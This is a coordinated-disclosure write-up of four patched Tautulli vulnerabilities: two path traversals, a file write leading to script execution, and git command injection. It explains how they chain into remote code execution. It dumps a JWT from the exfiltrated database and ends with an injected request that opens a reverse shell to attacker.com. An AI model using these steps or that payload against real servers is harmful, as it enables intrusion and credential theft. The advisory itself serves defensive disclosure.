# CVE-2025-5876{0-3}


[Tautulli](https://github.com/Tautulli/Tautulli) is a Python-based web application for managing monitoring, analytics and notifications for [Plex Media Server](https:plex.tv/). The project is open-sourced under the GPL-3.0 license and currently has over 6.1k stars on GitHub.

Four vulnerabilities affecting versions 2.15.3 (published August 3rd, 2025) and
prior were identified during a review of Tautulli's codebase. With certain
preconditions, these vulnerabilities can be chained to achieve unauthenticated
remote code execution on the application server.

All issues below were disclosed to the project maintainers, and have been
patched in version 2.16.0 (released September 11th, 2025).


#### Path Traversal in `/image` endpoint (CVE-2025-58760)

Tautulli is built upon the [CherryPy](https://docs.cherrypy.dev/en/latest/) minimalist web framework. Within CherryPy, routes are defined similarly to Flask, using decorators to expose endpoints and attach request-handling logic. For example, in the following function:

```python
@cherrypy.expose
@cherrypy.tools.json_out()
@requireAuth(member_of("admin"))
def save_pms_token(self, token=None, client_id=None, **kwargs):
    if token is not None:
        plexpy.CONFIG.PMS_TOKEN = token
    if client_id is not None:
        plexpy.CONFIG.PMS_CLIENT_ID = client_id
    plexpy.CONFIG.write()
```

-   `@cherrypy.expose` marks the function as an HTTP-accessible endpoint. Without this, CherryPy ignores the function for routing purposes.
-   `@cherrypy.tools.json_out()` automatically serialises the return value of the function to JSON.
-   `@requireAuth(member_of("admin"))` is a custom decorator which modifies the function's \`auth.require\` attribute to include authentication conditions.

To enumerate the pre-authentication attack surface, we focused on routes exposed via `@cherrypy.expose` that did not enforce authentication with `@requireAuth`. Immediately, the following function seemed interesting:

```python
@cherrypy.expose
def image(self, *args, **kwargs):
    if args:
        cherrypy.response.headers['Cache-Control'] = 'max-age=3600'  # 1 hour

        if len(args) >= 2 and args[0] == 'images':
            resource_dir = os.path.join(str(plexpy.PROG_DIR), 'data/interfaces/default/')
            try:
                return serve_file(path=os.path.join(resource_dir, *args), content_type='image/png')
            except NotFound:
                return
    ⋮
    return
```

Looking through the documentation for how CherryPy handles [route dispatch](https://docs.cherrypy.dev/en/stable/pkg/cherrypy._cpdispatch.html#cherrypy._cpdispatch.Dispatcher.find_handler), we see that any path segments which aren't used in resolving the route are automatically passed as positional arguments to the route handler. Hence in the above function, we have complete control over the value of `*args`. These arguments are then joined to `data/interfaces/default/` and passed to `serve_file` without sanitisation, enabling path traversal. Since the file contents are returned to the user directly, this gives us an arbitrary file read on the application server.



#### Path Traversal in  `/pms_image_proxy` (CVE-2025-58761)

Another candidate for path traversal was the `/pms_image_proxy` endpoint. This endpoint is used to fetch an image directly from the backing Plex Media Server, typically for movie thumbnails or background images. The image to be fetched is specified through an `img` URL parameter, which can either be a URL or a file path.

```python
@addtoapi('pms_image_proxy')
def real_pms_image_proxy(self, img=None, rating_key=None, width=750, height=1000,
                         opacity=100, background='000000', blur=0, img_format='png',
                         fallback=None, refresh=False, clip=False, **kwargs):

    cherrypy.response.headers['Cache-Control'] = 'max-age=2592000'  # 30 days

    if isinstance(img, str) and img.startswith('interfaces/default/images'):
        fp = os.path.join(plexpy.PROG_DIR, 'data', img)
        ext = img.rsplit(".", 1)[-1]
        if ext == 'svg':
            content_type = 'image/svg+xml'
        else:
            content_type = 'image/{}'.format(ext)
        return serve_file(path=fp, content_type=content_type)
```

Although there is some validation to ensure that `img` begins with the prefix `interfaces/default/images`, this can be bypassed by passing an `img` parameter which begins with a valid prefix, and then adjoining path traversal characters in order to reach files outside of intended directories. This gives us a second method of reading arbitrary files from the application server.



#### Impacts

In addition to the usual LFI targets, there are two files of particular importance within Tautulli, as they contain application specific secrets which may enable privilege escalation.

The first is the application's configuration file, located at `/config/config.ini` within the published Docker image. This file contains:

-   The administrator's hashed password,
-   An API key intended for programmatic access to a restricted subset of features,
-   The symmetric secret used to sign JWTs

Originally, we thought that having access to the JWT secret meant we would be able to issue JWTs to ourselves to escalate privileges. Unfortunately, the application stores all JWTs it issues inside the database, and during the authentication flow, it performs one final check to see if the client's JWT is present within the DB:

```python
def check_jwt_token():
    jwt_token = get_jwt_token()

    if jwt_token:
        try:
            payload = jwt.decode(
                jwt_token, plexpy.CONFIG.JWT_SECRET, leeway=timedelta(seconds=10), algorithms=[JWT_ALGORITHM]
            )
        except (jwt.DecodeError, jwt.ExpiredSignatureError):
            return None

        if not Users().get_user_login(jwt_token=jwt_token): # <--- JWT in database check
            return None

        return payload
```

Because of this, we can't forge JWTs for ourselves. However, we can use our arbitrary read to exfiltrate the application database, located at `/config/tautulli.db` within the Docker image. The JWTs issued by Tautulli expire after 30 days when 'remember me' is checked on sign-in, and issued tokens are only purged from the database when the user manually logs out or when the user attempts to access an authenticated route with an expired token. Hence with some luck, there may still be tokens cached within the database which can be exfiltrated and reused.

```sh
❯ sqlite3 tautulli.db
SQLite version 3.50.4 2025-07-30 19:33:53
Enter ".help" for usage hints.
sqlite> select jwt_token from user_login;
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjpudWxsLCJ1c2VyIjoiYWRtaW4iLCJ1c2VyX2dyb3VwIjoiYWRtaW4iLCJleHAiOjE3NTc0OTM1MjB9.VWP6TVbuLRM_2xILP7cBJmW3IXpXTTYLEFd4li_gaeU
```

An alternative, of course is to crack the hashed password we obtained from `/config/config.ini`. Assuming all goes well, we can elevate our privileges from an unauthenticated attacker to an administrator, allowing us to access the authenticated attack surface.

Frustratingly, this database check is the only barrier stopping us from escalating privileges unconditionally. Although a 30 day expiry window still gives an attacker good chances of success, it nonetheless requires a bit of luck to pull off, hence why we can only say 'unauthenticated(*) RCE'; with an asterisk.



#### Authenticated RCE (Two Methods)

Upon finding the privilege escalation attack path, we turned our eye to any authenticated methods of achieving RCE, which we could chain with the earlier vulnerabilities.

One feature available to administrative users in Tautulli is the script notification agent. The intended purpose of this agent is to send notifications to registered users, and it can be configured to run a Python script (file ending in `.py`) directly from the local filesystem. Hence if we can get a file write where we control the extension, we can automatically escalate to RCE.

Unfortunately, there seems to be a dearth of good write primitives available to us, even with administrative privileges. This leads to the following rather inelegant method:



#### RCE via file write primitive and script agent (CVE-2025-58762)

Administrators within Tautulli can change the URL of the Plex Media Server (PMS) within the application's settings. By pointing this to an attacker-controlled server, they can trick the `pms_image_proxy` endpoint into writing a file for them.

The attack proceeds as follows:

1.  The attacker calls `/pms_image_proxy` with the `img` parameter set to a URL beginning with `http`,
2.  Within this call, they set the `img_format` parameter to `py`.

Tautulli constructs the destination file path by combining a hash with the user-controlled `img_format` parameter. Since `img_format` isn't sanitised, this allows the attacker to control the final file extension.

```python
@addtoapi('pms_image_proxy')
def real_pms_image_proxy(self, img=None, rating_key=None, width=750, height=1000,
                         opacity=100, background='000000', blur=0, img_format='png',
                         fallback=None, refresh=False, clip=False, **kwargs):

    ⋮
    img_hash = notification_handler.set_hash_image_info(
        img=img, rating_key=rating_key, width=width, height=height,
        opacity=opacity, background=background, blur=blur, fallback=fallback,
        add_to_db=return_hash)

    if return_hash:
        return {'img_hash': img_hash}

    fp = '{}.{}'.format(img_hash, img_format)  # we want to be able to preview the thumbs
    c_dir = os.path.join(plexpy.CONFIG.CACHE_DIR, 'images')
    ffp = os.path.join(c_dir, fp)
```

If the destination file doesn't exist locally, Tautulli will fetch it from the configured PMS (the attacker's server) and write the response content to the path specified by the attacker.

```python
    ⋮
    try:
    ⋮
    except NotFound:
        # the image does not exist, download it from pms
        try:
            pms_connect = pmsconnect.PmsConnect()
            pms_connect.request_handler._silent = True
            result = pms_connect.get_image(img=img,
                                           width=width,
                                           height=height,
                                           opacity=opacity,
                                           background=background,
                                           blur=blur,
                                           img_format=img_format,
                                           clip=clip,
                                           refresh=refresh)

            if result and result[0]:
                cherrypy.response.headers['Content-type'] = result[1]
                if plexpy.CONFIG.CACHE_IMAGES and 'indexes' not in img:
                    with open(ffp, 'wb') as f:
                        f.write(result[0])
```

Assuming the PMS server is configured to be `https://attacker.com/`, the `pms_connect.get_image` function will make a HTTP request to the URL

```
https://attacker.com/photo/:/transcoe?url=http://example.com/image?width=1000&height=1500&format=py
```

The attacker can then reply to this request with whatever response they like, the contents of which will be written to the destination file. With an arbitrary Python script now written to the filesystem, the attacker can use the script notification agent to execute the script, achieving RCE.



#### RCE via command injection (CVE-2025-58763)

Alternatively, if we want to avoid the convoluted method above, and the Tautulli instance we're targeting is installed manually, then there is a simpler method of achieving RCE.

When Tautulli is cloned directly from GitHub and installed manually, the application manages updates and versioning through calls to the `git` command. In the code, this is performed through the `runGit` function in `versioncheck.py`.

```python
def runGit(args):
    if plexpy.CONFIG.GIT_PATH:
        git_locations = ['"' + plexpy.CONFIG.GIT_PATH + '"']
    else:
        git_locations = ['git']
    if platform.system().lower() == 'darwin':
        git_locations.append('/usr/local/git/bin/git')
    output = err = None
    for cur_git in git_locations:
        cmd = cur_git + ' ' + args
        try:
            logger.debug('Trying to execute: "' + cmd + '" with shell in ' + plexpy.PROG_DIR)
            p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True, cwd=plexpy.PROG_DIR)
            output, err = p.communicate()
            output = output.strip().decode()
            logger.debug('Git output: ' + output)
```

Since `shell=True` is passed to `subproces.Popen`, this call is vulnerable to to command injection, as shell characters within arguments will be passed to the underlying shell.

A concrete location where this can be triggered is in the `checkout_git_branch` endpoint. This endpoint stores a user-supplied remote and branch name into the `GIT_REMOTE` and `GIT_BRANCH` configuration keys without sanitisation.

```python
@cherrypy.expose
@requireAuth(member_of("admin"))
def checkout_git_branch(self, git_remote=None, git_branch=None, **kwargs):
    if git_branch == plexpy.CONFIG.GIT_BRANCH:
        logger.error("Already on the %s branch" % git_branch)
        raise cherrypy.HTTPRedirect(plexpy.HTTP_ROOT + "home")

    # Set the new git remote and branch
    plexpy.CONFIG.GIT_REMOTE = git_remote
    plexpy.CONFIG.GIT_BRANCH = git_branch
    plexpy.CONFIG.write()
    return self.do_state_change('checkout', 'Switching Git Branches', 120)
```

Downstream, these keys are then fetched and passed directly into `runGit` using a format string.

```python
@cherrypy.expose
@requireAuth(member_of("admin"))
def checkout_git_branch():
    if plexpy.INSTALL_TYPE == 'git':
        logger.info('Attempting to checkout git branch "{}/{}"'.format(plexpy.CONFIG.GIT_REMOTE,
                                                                       plexpy.CONFIG.GIT_BRANCH))

        output, err = runGit('fetch {}'.format(plexpy.CONFIG.GIT_REMOTE))
        output, err = runGit('checkout {}'.format(plexpy.CONFIG.GIT_BRANCH))
```

Hence, code execution can be obtained by using `$()` interpolation in a command like this:

```
GET /checkout_git_branch?git_remote=$(sh+-c+'bash+-i+>%26+/dev/tcp/attacker.com/443+0>%261')
```



#### Timeline

-   August 13 2025: Initial disclosure to Tautulli via GitHub Security Advisories
-   September 2 2025: Patches implemented and retested.
-   September 9 2025: Coordinated disclosure: Tautulli v2.16.0 and GitHub Security Advisories published.

